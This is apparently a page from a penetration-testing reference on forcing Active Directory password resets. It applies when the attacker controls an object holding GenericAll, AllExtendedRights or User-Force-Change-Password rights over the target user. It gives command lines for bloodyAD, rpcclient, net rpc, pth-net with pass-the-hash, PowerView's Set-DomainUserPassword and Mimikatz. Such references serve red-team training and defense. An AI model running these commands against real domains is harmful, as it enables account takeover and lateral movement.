
This abuse can be carried out when controlling an object that has a `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` over the target user


# Linux

The easiest

```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password $TargetUser $NewPassword
```


An alternative of rpcclient can also be used
The [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can also be used on UNIX-like systems when the package `samba-common-bin` is missing.

```
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```


```
# With net and cleartext credentials (will be prompted)
net rpc password $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController

# With net and cleartext credentials
net rpc password $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController

# With Pass-the-Hash
pth-net rpc password $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
```




# Windows

The attacker can change the password of the user. This can be achieved with [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module).

```
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

Mimikatz's [`lsadump::setntlm`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/setntlm) can also be used for that purpose.